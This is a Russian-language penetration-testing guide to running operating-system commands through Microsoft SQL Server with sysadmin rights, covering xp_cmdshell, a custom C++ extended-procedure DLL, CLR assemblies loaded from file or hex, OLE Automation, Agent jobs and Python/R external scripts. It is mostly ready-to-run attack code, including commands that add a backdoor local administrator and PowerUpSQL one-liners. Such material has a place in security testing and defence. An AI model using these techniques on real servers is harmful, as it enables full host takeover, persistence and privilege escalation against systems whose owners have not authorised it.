
## Введение

В этом материале собраны все основные методы выполнения команд операционной системы (ОС) через Microsoft SQL Server.
Каждая техника имеет свои **предпосылки**, **особенности реализации** и **ограничения**.
Все методы требуют высоких привилегий (обычно `sysadmin`), но иногда возможны обходы.

---

## 1. `xp_cmdshell` — классика

### Суть
Встроенная расширенная хранимая процедура, которая запускает командную строку Windows.

### Условия
- По умолчанию **отключена** (начиная с SQL Server 2005).
- Требует прав `sysadmin` для включения и использования.
- Работает в контексте **службы SQL Server** (обычно `NT SERVICE\MSSQLSERVER` или `LOCAL SYSTEM`).

### Как включить (если выключена)
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Примеры использования
```sql
-- Простая команда
EXEC xp_cmdshell 'whoami';

-- Вывод в файл
EXEC xp_cmdshell 'ipconfig > C:\temp\ip.txt';

-- Создание пользователя
EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';
```

### Если процедура была удалена
Можно переустановить из `xplog70.dll`:
```sql
sp_addextendedproc 'xp_cmdshell', 'xplog70.dll';
```

### Инструменты автоматизации (PowerUpSQL)
```powershell
Invoke-SQLOSCmd -Username sa -Password Pass123 -Instance "SRV\INST" -Command "whoami"
```

### Комментарий
- Самый простой и надёжный способ, если доступен.
- **Минус**: часто отключается политиками безопасности.
- **Применимость**: Windows + MSSQL (на Linux не работает).

---

## 2. Расширенные хранимые процедуры (Extended Stored Procedures)

### 2.1 Определение и назначение

Расширенные хранимые процедуры — это динамически подключаемая библиотека (DLL), написанная на C или C++, которая регистрируется в SQL Server и становится доступной для вызова как обычная хранимая процедура. В отличие от стандартных T-SQL-процедур, XP выполняются в **процессе SQL Server** и имеют прямой доступ к системным ресурсам операционной системы.

Основная цель XPs — расширение функциональности SQL Server за счёт выполнения операций, недоступных из T-SQL: работа с файловой системой, реестром, внешними устройствами, сетевыми сокетами и т.д.

---

### 2.2 Исторический контекст

Технология XPs была представлена в ранних версиях SQL Server (6.0, 6.5) как основной способ интеграции с внешним миром. До появления CLR-интеграции (SQL Server 2005) это был *единственный* способ выполнить код на сервере из SQL.

С выходом SQL Server 2005 Microsoft представила **CLR-интеграцию** как более безопасную и управляемую альтернативу. Начиная с этого момента, XPs считаются **устаревшей** технологией и поддерживаются только для обратной совместимости. Microsoft рекомендует использовать CLR-сборки для всех новых разработок.

**Важно:** в будущих версиях SQL Server поддержка XPs может быть полностью удалена.

---

### 2.3 Технические детали

#### 2.3.1. Прототип функции-точки входа

Каждая функция, которая становится расширенной процедурой, должна иметь строго определённую сигнатуру:

```cpp
SRVRETCODE xp_procedureName(SRVPROC *srvproc);
```

- **`SRVRETCODE`** — тип возвращаемого значения (обычно `XP_OK` при успехе или `XP_ERROR` при ошибке).
- **`xp_procedureName`** — имя процедуры (префикс `xp_` не обязателен, но является стандартом де-факто).
- **`SRVPROC *srvproc`** — указатель на структуру, представляющую клиентское соединение. Через неё осуществляется передача параметров, отправка результатов и сообщений.

#### 2.3.2. Необходимые заголовочные файлы и библиотеки

Для компиляции XPs требуется установленный клиент SQL Server или SDK. Необходимые файлы:

- **`srv.h`** — заголовочный файл, содержащий определения констант, структур и функций Open Data Services (ODS).
- **`opends60.lib`** — библиотека импорта для `opends60.dll`, которая предоставляет реализацию ODS.

Пути к этим файлам зависят от версии SQL Server. Обычно они расположены в папке `MSSQL\Binn`.

#### 2.3.3. Экспорт функции

Функция должна быть доступна (экспортирована) из DLL. Сделать это можно двумя способами:

1. **Использование `__declspec(dllexport)`** (рекомендуемый способ для Visual Studio):
   ```cpp
   __declspec(dllexport) SRVRETCODE xp_mycmd(SRVPROC *srvproc) {
       // тело процедуры
   }
   ```

2. **Файл определения модуля (`.def`)** — в секции `EXPORTS` перечисляются имена экспортируемых функций.

#### 2.3.4. Функция `__GetXpVersion()`

Настоятельно рекомендуется (а в некоторых версиях обязательно) реализовать и экспортировать функцию `__GetXpVersion`:

```cpp
__declspec(dllexport) ULONG __GetXpVersion() {
    return ODS_VERSION;
}
```

Эта функция позволяет SQL Server проверить совместимость версий и корректно загрузить DLL. Возвращаемое значение `ODS_VERSION` определено в `srv.h`.

#### 2.3.5. Точка входа `DllMain`

Функция `DllMain` является опциональной. Если вы не напишете её самостоятельно, компилятор добавит стандартную реализацию, которая просто возвращает `TRUE`. Однако если требуется выполнить инициализацию или очистку ресурсов при загрузке/выгрузке DLL, вы можете определить собственную `DllMain`:

```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Инициализация
            break;
        case DLL_PROCESS_DETACH:
            // Очистка
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

---

### 2.4 Полный пример реализации XP на C++

Ниже представлен готовый код расширенной процедуры, которая принимает строку-команду, выполняет её через `cmd.exe` и возвращает результат клиенту.

```cpp
// dllmain.cpp : Определяет точку входа для приложения DLL.
#include "pch.h" 
#include <windows.h>
#include <srv.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "opends60.lib")

#ifndef XP_NOERROR
#define XP_NOERROR 0
#endif
#ifndef XP_ERROR
#define XP_ERROR 1
#endif

extern "C" {

    __declspec(dllexport) ULONG WINAPI __GetXpVersion() {
        return ODS_VERSION;
    }

    __declspec(dllexport) SRVRETCODE WINAPI xp_run_cmd(SRV_PROC* srvproc) {

        // 1. Проверка количества параметров
        if (srv_rpcparams(srvproc) != 1) {
            srv_sendmsg(srvproc, SRV_MSG_ERROR, 0, 0, 0, NULL, 0, 0,
                (char*)"ERROR: Exactly one parameter (the command) is required.", SRV_NULLTERM);
            srv_senddone(srvproc, SRV_DONE_ERROR, 0, 0);
            return XP_ERROR;
        }

        // 2. Получение параметра (упрощённо, без проверки типа)
        BYTE* pbData = (BYTE*)srv_paramdata(srvproc, 1);
        int len = srv_paramlen(srvproc, 1);

        if (pbData == NULL || len <= 0) {
            srv_sendmsg(srvproc, SRV_MSG_ERROR, 0, 0, 0, NULL, 0, 0,
                (char*)"ERROR: Invalid parameter data.", SRV_NULLTERM);
            srv_senddone(srvproc, SRV_DONE_ERROR, 0, 0);
            return XP_ERROR;
        }

        // 3. Копируем команду (обрезаем до 1023 символов)
        char command[1024] = { 0 };
        int cmdLen = (len < sizeof(command) - 1) ? len : sizeof(command) - 1;
        memcpy(command, pbData, cmdLen);
        command[cmdLen] = '\0';

        // 4. Выполняем команду и захватываем вывод
        char result[4096] = { 0 };
        FILE* pipe = _popen(command, "r");
        if (pipe == NULL) {
            srv_sendmsg(srvproc, SRV_MSG_ERROR, 0, 0, 0, NULL, 0, 0,
                (char*)"ERROR: Failed to execute command.", SRV_NULLTERM);
            srv_senddone(srvproc, SRV_DONE_ERROR, 0, 0);
            return XP_ERROR;
        }

        size_t bytesRead = fread(result, sizeof(char), sizeof(result) - 1, pipe);
        result[bytesRead] = '\0';
        _pclose(pipe);

        // 5. Отправляем результат как сообщение (простой способ)
        if (bytesRead > 0) {
            srv_sendmsg(srvproc, SRV_MSG_INFO, 0, 0, 0, NULL, 0, 0,
                (char*)result, SRV_NULLTERM);
        } else {
            srv_sendmsg(srvproc, SRV_MSG_INFO, 0, 0, 0, NULL, 0, 0,
                (char*)"(Command executed, no output)", SRV_NULLTERM);
        }

        // 6. Сигнализируем об успешном завершении
        srv_senddone(srvproc, SRV_DONE_FINAL, 0, 0);

        return XP_NOERROR;
    }

} // Конец extern "C"

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```


---

### 2.5 Компиляция и сборка DLL

#### 2.5.1. Настройка проекта в Visual Studio

1. Создайте новый проект типа **Dynamic-Link Library (DLL)**.
2. Добавьте в проект пути к заголовочным файлам SQL Server (папка, содержащая `srv.h`).
3. Добавьте `opends60.lib` в список дополнительных зависимостей линковщика.
4. Убедитесь, что проект компилируется для правильной разрядности (x86 или x64) в соответствии с версией SQL Server.
5. Соберите проект. В результате получится файл, например, `xp_run_cmd.dll`.

#### 2.5.2. Ручная компиляция (командная строка)

Если Visual Studio отсутствует, можно использовать компилятор Microsoft C/C++ (cl.exe) из командной строки:

```cmd
cl /LD /I "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn" xp_run_cmd.cpp /link opends60.lib
```

Пути к заголовочным файлам и библиотеке необходимо скорректировать под вашу установку SQL Server.

---

### 2.6 Регистрация в SQL Server

После получения DLL её необходимо зарегистрировать в SQL Server. Это делается с помощью системной хранимой процедуры `sp_addextendedproc`.

#### 2.6.1. Размещение DLL

Скопируйте файл `xp_run_cmd.dll` в папку, доступную для службы SQL Server. Рекомендуется использовать папку `Binn` самого SQL Server или любую другую локальную папку с необходимыми правами доступа.

#### 2.6.2. Команда регистрации

Подключитесь к SQL Server с правами `sysadmin` и выполните:

```sql
USE master;
GO
EXEC sp_addxtendedproc 'xp_run_cmd', 'C:\tmp\xp_run_cmd.dll';
GO
```

Теперь процедура доступна для вызова в любой базе данных.
<img width="793" height="282" alt="Pasted image 20260910105111" src="https://github.com/user-attachments/assets/ccef8ff0-813e-4ad5-b4c3-46ac09001b2d" />




#### 2.6.3. Вызов процедуры

```sql
EXEC xp_run_cmd 'whoami';
```

Результат выполнения команды будет возвращён как набор строк.

#### 2.6.4. Удаление процедуры

Для удаления регистрации используется `sp_dropextendedproc`:

```sql
EXEC sp_dropextendedproc 'xp_run_cmd';
```

После этого DLL можно удалить с диска.

---

### 2.7 Вопросы безопасности

- **Работа в процессе SQL Server**: XP выполняется в том же адресном пространстве, что и SQL Server. Любая ошибка в коде (например, обращение по нулевому указателю) может привести к падению всей службы.
- **Неуправляемый код**: XPs — это неуправляемый (native) код. Они имеют полный доступ к системе и могут выполнять любые операции, включая модификацию системных файлов и реестра.
- **Права доступа**: XPs выполняются от имени учётной записи службы SQL Server. Поэтому они могут быть использованы для повышения привилегий.
- **Рекомендации**:
    - Используйте XPs только в крайних случаях.
    - Тщательно проверяйте входные параметры.
    - Избегайте использования XPs в системах с высокими требованиями к безопасности.
    - По возможности используйте CLR-интеграцию.

---

### 2.8 Сравнение с CLR-интеграцией

| Характеристика         | Extended Stored Procedures      | CLR-интеграция                              |
| ---------------------- | ------------------------------- | ------------------------------------------- |
| **Язык**               | C / C++                         | C#, VB.NET                                  |
| **Управляемость**      | Неуправляемый код               | Управляемый код (CLR)                       |
| **Безопасность**       | Риск падения SQL Server         | Безопаснее, среда CLR изолирует ошибки      |
| **Разработка**         | Требует знания C++ и ODS API    | Использует стандартный .NET Framework       |
| **Поддержка**          | Устаревшая технология           | Современная, активно развивается            |
| **Производительность** | Очень высокая                   | Высокая (с небольшими накладными расходами) |
| **Будущее**            | Будет удалена в будущих версиях | Поддерживается и расширяется                |

---

## 3. CLR-сборки (SQL CLR)

### Суть
Интеграция .NET-кода (C#, VB.NET) в SQL Server. Можно загрузить управляемую сборку (DLL), создать хранимую процедуру, которая будет вызывать метод из этой сборки, и выполнять любые действия, включая запуск процессов.

### Требования
- Права `sysadmin` или `CREATE ASSEMBLY`.
- CLR должен быть включён (`clr enabled = 1`).
- Для выполнения команд ОС нужен уровень разрешений `UNSAFE` или `EXTERNAL_ACCESS`.
- В новых версиях (2017+) требуется либо отключить `clr strict security`, либо подписать сборку и добавить в доверенные.

### Включение CLR
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;
```

### Пример кода на C# (класс с методом для выполнения команд)
```csharp
using System;
using System.Data.SqlTypes;
using System.Diagnostics;
using Microsoft.SqlServer.Server;

public class CommandExecutor
{
    [SqlProcedure]
    public static void ExecCmd(SqlString command)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + command.ToString();
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.CreateNoWindow = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();

        SqlDataRecord record = new SqlDataRecord(
            new SqlMetaData("Output", System.Data.SqlDbType.NVarChar, 4000)
        );
        record.SetString(0, output);
        SqlContext.Pipe.Send(record);
    }
}
```

### Компиляция DLL
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:cmd_exec.dll cmd_exec.cs
```

### Загрузка и создание процедуры
```bash
# Вычисляем SHa512 для файла 
sha512sum CmdExecutor.dll

```

```sql
-- Доверяем сборку (для SQL 2017+)
EXEC sys.sp_add_trusted_assembly 0x<SHA512_хэш_файла>, N'cmd_exec';
-- Создаём сборку (из файла)
CREATE ASSEMBLY my_assembly
FROM 'C:\temp\cmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;

-- Создаём процедуру-обёртку
CREATE PROCEDURE dbo.ExecCmd @cmd NVARCHAR(4000)
AS EXTERNAL NAME CmdExecutor.CommandExecutor.ExecCmd;

-- Выполняем
EXEC dbo.ExecCmd 'whoami';
```

### Альтернатива: загрузка по HEX-строке (без файла)

```bash
# Вычисляем SHa512 для файла 
sha512sum CmdExecutor.dll
# Делаем полный HEX-дамп для файла
xxd -p CmdExecutor.dll | tr -d '\n'
```

```sql
-- Устанавливаем доверие к сборке (для SQL 2017+)
EXEC sys.sp_add_trusted_assembly 0x<SHA512_хэш_файла>, N'cmd_exec';

-- Грузим сборку
CREATE ASSEMBLY my_assembly
FROM 0x4D5A90000300000004000000F... (полный HEX-дамп)
WITH PERMISSION_SET = UNSAFE;
```
<img width="1127" height="593" alt="Pasted image 20260910105704" src="https://github.com/user-attachments/assets/8e97916d-2747-4486-a731-f56b072886e4" />



```sql
-- Создаём процедуру-обёртку
CREATE PROCEDURE dbo.ExecCmd @cmd NVARCHAR(4000)
AS EXTERNAL NAME CmdExecutor.CommandExecutor.ExecCmd;

-- Выполняем
EXEC dbo.ExecCmd 'whoami';
```

<img width="1052" height="145" alt="Pasted image 20260910105838" src="https://github.com/user-attachments/assets/60ea38d1-0e9d-4172-aefe-461ddc0cca60" />

### Автоматизация (PowerUpSQL)
```powershell
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd
Invoke-SQLOSCmdCLR -Username sa -Password Pass123 -Instance "SRV\INST" -Command "whoami"
```

### Комментарий
- Очень гибкий метод, можно делать что угодно.
- Требует больше шагов, но после настройки работает отлично.
- **На Linux** — только `SAFE` сборки, поэтому не работает для выполнения команд.

---

## 4. OLE Automation Procedures (`sp_OACreate`, `sp_OAMethod` и др.)

### Суть
Использование COM-объектов через OLE Automation. Можно создать экземпляр `WScript.Shell` и выполнить любую команду.

### Предпосылки
- Процедуры OLE отключены по умолчанию.
- Требуются права `sysadmin` для включения.
- Работает только на **Windows**.

### Включение
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;
```

### Выполнение команды
```sql
DECLARE @shell INT, @hr INT; EXEC @hr = sp_OACreate 'WScript.Shell', @shell OUTPUT; EXEC @hr = sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\tmp\out.txt', 0, TRUE; EXEC @hr = sp_OADestroy @shell;
```

### Результат
Вывод команды сохраняется в файл, затем его можно прочитать через `OPENROWSET(BULK...)` или другим способом.

```sql
SELECT CAST(BulkColumn AS VARCHAR(MAX)) FROM OPENROWSET(BULK 'C:\tmp\out.txt', SINGLE_BLOB) AS x;
```

<img width="1124" height="501" alt="Pasted image 20260910105952" src="https://github.com/user-attachments/assets/610dad05-52fa-4460-9864-53c1d6aa5f3b" />


### Автоматизация (PowerUpSQL)
```powershell
Invoke-SQLOSCmdOle -Username sa -Password Pass123 -Instance "SRV\INST" -Command "whoami"
```

### Комментарий
- Работает, если не отключена политикой безопасности.
- Медленнее, чем `xp_cmdshell`, но иногда остаётся доступной.
- **Не поддерживается** на Linux.

---

## 5. Задания SQL Server Agent (`sp_start_job`)

### Суть
Создание и запуск задания (Job) через SQL Server Agent. Задание может содержать шаги на `CmdExec`, `PowerShell`, `VBScript`, `JScript` и другие.

### Предпосылки
- Служба SQL Server Agent **должна быть запущена**.
- Требуются права `sysadmin` или членство в ролях `SQLAgentUserRole`, `SQLAgentReaderRole`, `SQLAgentOperatorRole`.
- Задание выполняется от имени **службы Agent** (обычно `NT SERVICE\SQLSERVERAGENT`), если не настроен прокси-аккаунт.

### Шаги
```sql
USE msdb;
-- 1. Создаём задание
EXEC dbo.sp_add_job @job_name = N'NewJob';

-- 2. Добавляем шаг (здесь PowerShell)
EXEC sp_add_jobstep @job_name = N'NewJob',@step_name = N'Step1',@subsystem = N'PowerShell',@command = N'whoami > C:\tmp\agent_output.txt';

-- 3. Привязываем к серверу
EXEC dbo.sp_add_jobserver @job_name = N'MyJob';

-- 4. Запускаем
EXEC dbo.sp_start_job N'NewJob';

-- 5. Удаляем (после выполнения)
EXEC dbo.sp_delete_job @job_name = N'NewJob';
```
<img width="1130" height="331" alt="Pasted image 20260910110746" src="https://github.com/user-attachments/assets/b4597121-481b-4c9a-86b4-1d979a593259" />



### Возможные подсистемы
- `CmdExec` — командная строка
- `PowerShell` — PowerShell
- `VBScript` — VBS
- `JScript` — JScript
- `TSQL` — T-SQL (обычно не для команд ОС)

### Просмотр существующих заданий
```sql
SELECT job_id, name FROM msdb.dbo.sysjobs;
```

### Автоматизация (PowerUpSQL)
```powershell
Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Pass123 -Instance "SRV\INST" -Command "whoami"
```

### Комментарий
- Очень мощный метод, особенно если `xp_cmdshell` отключена.
- Требует запущенного Agent — если он остановлен, можно попытаться запустить через другие методы.
- На **Linux** Agent может отсутствовать или работать нестабильно.

---

## 6. Внешние скрипты (Python / R)

### Суть
Функция `sp_execute_external_script` позволяет выполнять скрипты на Python или R прямо из SQL Server. Если в скрипте вызвать `subprocess` (Python) или `system()` (R), можно выполнить команды ОС.

### Требования
- Установлен компонент **Machine Learning Services** (ранее Advanced Analytics Extensions) с поддержкой Python или R.
- Включена опция `external scripts enabled`.
- Выполняется в контексте службы **Launchpad** (обычно `NT SERVICE\MSSQLLaunchpad`), но фактический запуск происходит от имени учётной записи, настроенной для внешних скриптов.

### Включение (если отключено)
```sql
EXEC sp_configure 'external scripts enabled', 1;
RECONFIGURE;
```

### Пример с Python
```sql
EXEC sp_execute_external_script
    @language = N'Python',
    @script = N'
import subprocess
p = subprocess.Popen("whoami", stdout=subprocess.PIPE, shell=True)
output = p.stdout.read().decode("utf-8")
OutputDataSet = pandas.DataFrame([output])
'
WITH RESULT SETS ((cmd_out NVARCHAR(MAX)));
```

### Пример с R
```sql
EXEC sp_execute_external_script
    @language = N'R',
    @script = N'
OutputDataSet <- data.frame(system("whoami", intern = TRUE))
'
WITH RESULT SETS ((cmd_out NVARCHAR(MAX)));
```

### Автоматизация (PowerUpSQL)
```powershell
Invoke-SQLOSCmdPython -Username sa -Password Pass123 -Instance "SRV\INST" -Command "whoami"
Invoke-SQLOSCmdR -Username sa -Password Pass123 -Instance "SRV\INST" -Command "whoami"
```

### Комментарий
- Современный метод, появился в SQL Server 2016.
- Требует отдельной установки компонентов, что есть не везде.
- Даёт доступ к мощным языкам и возможность обходить многие ограничения.
- Работает и на Linux (если установлены соответствующие пакеты).

---

## Сравнительная таблица

| Метод            | Windows | Linux   | Требует прав | По умолчанию включён | Сложность |
| ---------------- | ------- | ------- | ------------ | -------------------- | --------- |
| `xp_cmdshell`    | ✅       | ❌       | `sysadmin`   | ❌                    | Легко     |
| Extended SP      | ✅       | ❌       | `sysadmin`   | ❌                    | Сложно    |
| CLR              | ✅       | ⚠️ (\*) | `sysadmin`   | ❌                    | Средне    |
| OLE Automation   | ✅       | ❌       | `sysadmin`   | ❌                    | Средне    |
| Agent Jobs       | ✅       | ⚠️      | `sysadmin`   | ❌                    | Легко     |
| External Scripts | ✅       | ✅       | `sysadmin`   | ❌                    | Легко     |

> (\*) На Linux поддерживаются только `SAFE` сборки, поэтому выполнение команд через CLR невозможно.

---

## Заключение

Каждая техника имеет свой смысл:
- Если доступна **`xp_cmdshell`** — используйте её, это проще всего.
- Если она отключена, но работает **Agent** — используйте задания.
- Если Agent не работает, но есть **CLR** — загружайте сборку.
- Если CLR недоступен, пробуйте **OLE** (на Windows) или **External Scripts** (если установлены).
- На **Linux** основной вектор — `sp_execute_external_script` (Python/R) или, если повезёт, Agent.

Все методы требуют привилегий `sysadmin`, поэтому в реальных атаках они применяются после получения `sysadmin` через инъекции, уязвимости, кражу учётных данных или повышение привилегий любым доступным путем.

---

## Источники
- [NetSPI: Attacking SQL Server CLR Assemblies](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)
- [Optiv: MSSQL Agent Jobs for Command Execution](https://www.optiv.com/explore-optiv-insights/blog/mssql-agent-jobs-command-execution)


